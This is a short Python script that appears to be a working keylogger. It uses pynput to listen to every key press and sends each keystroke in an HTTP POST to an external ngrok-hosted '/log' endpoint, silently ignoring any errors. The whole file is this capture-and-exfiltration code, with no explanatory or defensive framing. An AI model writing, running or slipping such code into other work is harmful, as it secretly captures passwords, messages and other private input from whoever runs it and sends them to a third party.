import requests
from pynput import keyboard


def on_press(key):
    try:
        k = str(key)
        requests.post("https://kingfish-model-racer.ngrok-free.app/log", json={"key": k})
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
